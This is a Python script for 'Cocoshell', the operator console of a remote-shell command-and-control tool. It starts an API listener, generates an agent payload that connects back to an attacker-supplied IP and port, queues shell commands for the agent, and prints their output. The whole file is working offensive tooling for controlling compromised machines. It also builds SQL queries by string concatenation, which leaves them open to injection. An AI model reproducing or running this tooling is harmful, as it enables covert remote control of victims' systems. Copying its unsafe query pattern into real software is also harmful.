#!/usr/bin/env python
import subprocess
import time
import sqlite3
import argparse
import os
from os.path import exists
from core.payload import generate

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--lhost", help="the ip the agent will connect to")
parser.add_argument("-p", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-s", "--sleep", help="the amount of seconds the agent waits for the next command (default: 1)")
args, leftovers = parser.parse_known_args()

if args.lhost is not None:
    lhost = args.lhost
else:
    print("[-] please use -l/--lhost to specify the ip the agent will connect to")
    exit()

if args.lport is not None:
    lport = args.lport
else:
    lport = '5000'

if args.sleep is not None:
    sleep = args.sleep
else:
    sleep = 1

print("[+] Cocoshell API starting")

api_url = 'http://0.0.0.0:' + lport
agent_url = 'http://' + lhost + ':' + lport

try:
    api_log = open("logs/cocoshell_api.log", "a+")
except FileNotFoundError:
    with open("logs/cocoshell_api.log", "a+") as f:
        f.write('')
    api_log = open("logs/cocoshell_api.log", "a+")

proc = subprocess.Popen(["python3", "core/api.py"], stdout=api_log)
print("[*] Cocoshell API started on " + api_url)
print("[+] Connecting to database")
time.sleep(2.0)
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()
print("[*] Connected")
generate(agent_url, sleep)

waiting_for_result = False
result = None

#############################################################################

def new_command(cmd):
    if get_last_result()[3] == 1:
        cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES ('" + cmd + "', null, 0)")
        con.commit()
        print("[*] Command send to agent")
    else:
        print("[-] Still waiting for a result")
    return True # Always true as there is either a new command or we are still waiting for a result

def get_last_result():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def not_implemented():
    print("")
    print("[-] This function is currently unavailable but will probably be implemented in the future")

#############################################################################

try:
    while (True):
        command = input("cocoshell> ")
        if command == "exit":
            raise SystemExit
        if command == "":
            continue

        waiting_for_result = new_command(command)
        if (command == "help"):
            not_implemented()
            waiting_for_result = False
        if (command == "generate"):
            generate(agent_url)
            waiting_for_result = False
        if (command == "exit-agent"):
            waiting_for_result = False
            print("[-] Telling all agents to stop")
        if ("set-sleep" in command):
            waiting_for_result = False
            sleep_array = command.split("set-sleep")
            sleep_seconds = sleep_array[1].strip()
            print("[*] Telling the agent to sleep for " + str(sleep_seconds) + " seconds between each request")
            time.sleep(int(sleep))
            sleep = sleep_seconds
            cur.execute("UPDATE commands SET hasBeenRun = 1")

        while (waiting_for_result):
            if get_last_result()[3] == 1:
                waiting_for_result = False
                result = get_last_result()
                if result[2]:
                    print("[*] Command output:")
                    print("")
                    cleaned_result = result[2].replace('%NL%', os.linesep)
                    print(cleaned_result)
                else:
                    print("[-] No output for that command")
                    print("[-] The command probably failed")
    
except KeyboardInterrupt:
    print("")
    print("[-] Ctrl+C detected")
    pass
except SystemExit:
    print("")
    print("[-] Exiting")
    pass
finally:
    print("")
    print("[-] Cocoshell stopping")
    print("[-] Cleaning up")
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()
    proc.terminate()
    con.close()
    print("[-] Cocoshell stopped")
